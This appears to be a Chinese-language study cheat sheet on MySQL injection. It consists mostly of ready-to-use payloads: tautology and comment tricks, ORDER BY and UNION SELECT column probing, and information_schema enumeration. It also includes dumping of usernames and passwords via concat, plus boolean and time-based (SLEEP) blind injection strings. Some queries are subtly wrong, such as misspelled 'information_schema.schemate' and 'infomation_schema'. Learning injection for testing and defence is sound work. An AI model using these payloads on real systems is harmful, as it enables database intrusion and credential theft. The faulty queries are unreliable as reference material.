## MYSQL注入

### 1.1 Where+And/Or

#### （1）逻辑代码

SELECT * FROM users WHERE id = '1'

#### (2)实际修改

SELECT * FROM users WHERE id = '1' or '1' = '1'

SELECT * FROM users WHERE id = '1' and '1'='1' 

### 1.2 排序/限制

ORDER BY 1 

ORDER BY 3

### 1.3  注释符

(1)#xxx

(2)xxx-- 空格

(3) /\*xxx\*/

#### 例子

?id=1' OR 1=1-- 

?id=1' OR 1=1#

### 1.4  SQL常用函数

database()

user()

version()

@@version_compile_os

@@hostname

### Union相关

#### 判断列数（提取查询语法里的列数量）



ORDER BY / UNION SELECT

方法1: ORDER BY

?id=1 ORDER BY 1-- -

?id=1 ORDER BY 1,2-- -

?id=1 ORDER BY 1,2,3-- -

直到页面不报错，就说明列数对了

方法2: UNION SELECT

?id=1' UNION SELECT 1-- -

?id=2' UNION SELECT 1,2-- -

?id=3' UNION SELECT 1,2,3-- -

####  找到“回显位置”

?id=1' UNION SELECT 1,2,3-- -

页面有2，说明第二列可见

#### 枚举信息：库 / 表 / 列 / 数据

（1）当前数据库名（MYSQL）

UNION SELECT 1,database(),3

（2）所有数据库

UNION SELECT 1,schema_name,3

FROM information_schema.schemate-- -

（3）当前库下所有表名

UNION SELECT 1,table_name,3

FROM infomation_schema.tables

WHERE table_schema = database()-- -

（4）某表的列名（比如users）

UNION SELECT 1,column_name,3

FROM information_schema.columns

WHERE table_name='users'-- -

（5）读数据

UNION SELECT 1,username,3 FROM users-- -

UNION SELECT 1,concat(username,0x3a,password),3 FROM users-- -

CONCAT(col1,':',col2)

#### 通用函数

LENGTH(str)-- 字节长度

CHAR_LENGTH(str)-- 字符长度

SUBSTRING(str,pos,len)-- 提取字符串

MID(str,pos,len)-- 跟SUBSTRING差不多

ASCII(char)-- 字符转码 二分法

CONCAT(a,b,c)-- 字符串拼接

##### 盲注常用

LENGTH(database()) -- 库长度

SUBSTRING(database(),1,1)-- 第一个字符

ASCII(SUBSTRING(database(),1,1))-- 第一个字符ASCII

#### 布尔盲注逻辑(页面不报错，只返回true/false 风格)

##### 判断注入点

?id=1' and '1' = '1-- -

?id=2' and '1' ='2-- -

返回不一样明显有注入点

##### 用条件猜信息

?id=1' and ASCII(substring(database(),1,1)) > 77 -- -

通过页面反馈差别，逐个拆分

#### 时间盲注逻辑 （页面看不出区别通过反馈的延迟来推测）

;IF(条件，SLEEP(5),0）

?id=1'AND IF(ASCII(SUBSTRING(str,1,1))>77,SLEEP(5),0)-- -

#### 注意

SQL语法不需要;作为语法结尾，不带分号也是成立的。

